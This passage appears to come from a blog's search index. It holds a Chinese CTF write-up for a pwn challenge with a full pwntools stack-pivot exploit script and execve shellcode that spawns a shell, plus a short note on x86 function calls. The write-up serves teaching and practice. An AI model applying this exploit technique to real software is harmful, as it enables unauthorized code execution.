    <content type="text"><![CDATA[unexploit IDA打开，发现危险函数read造成栈溢出 checksec查看保护发现未开启NX，但是由于buf位于rbp-0x8处，且read限制读取0x20字符，需要用栈迁移的办法构造payload，从而控制程序流程执行shellcode首先构造payload1将栈迁移至bss段 1payload1 = 'a' * 8 + p64(bss - 0x8) + p64(read_addr) + p64(0xdeadbeef) 执行完read函数，通过leave和ret指令，使得rbp指向bss-0x8处，而rip指向read_addr，使得程序再次执行read函数继续构造payload2 1payload2 = 'a' * 8 + p64(bss + 0x8) + p64(read_addr) + p64(0xdeadbeef) 此次指向完毕，rsp和rbp会指向同一处:bss+8，而rip指向bss处的read函数，这样再次执行read的话，会先将read的下一条指令的地址压入栈中图上可以看到call read之前会push下一条指令，则rsp-4指向bss地址，而read将bss+8读入bss处修改了read的返回地址，执行完read之后来到bss+8，此时bss+8刚好是shellcode 1payload3 = p64(bss + 0x8) + shellcode 最终exp 12345678910111213141516171819from pwn import *#context.log_level = 'debug'p = process('./unexploit')elf = ELF('./unexploit')#gdb.attach(p)read_add = 0x40068abss_addr = elf.bss()shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'payload1 = 'a' * 8 + p64(bss_addr - 0x8) + p64(read_add) + p64(0xdeadbeef)payload2 = 'a' * 8 + p64(bss_addr + 0x8) + p64(read_add) + p64(0xdeadbeef)payload3 = p64(bss_addr + 0x8) + shellcodep.send(payload1)p.send(payload2)p.send(payload3)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数调用过程]]></title>
    <url>%2F2019%2F07%2F14%2Ffunc%2F</url>
    <content type="text"><![CDATA[1、调用者函数把被调函数所需要的参数按照与被调函数的形参顺序相反的顺序压入栈中,即:从右向左依次把被调函数所需要的参数压入栈; 2、调用者函数使用call指令调用被调函数,并把call指令的下一条指令的地址当成返回地址压入栈中(这个压栈操作隐含在call指令中); 3、在被调函数中,被调函数会先保存调用者函数的栈底地址(push ebp)(从高内在地址–》低内存地址),然后再保存调用者函数的栈顶地址,即:当前被调函数的栈底地址(mov ebp,esp); 4、在被调函数中,从ebp的位置处开始存放被调函数中的局部变量和临时变量,并且这些变量的地址按照定义时的顺序依次减小,即:这些变量的地址是按照栈的延伸方向排列的,先定义的变量先入栈,后定义的变量后入栈;]]></content>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
</search>
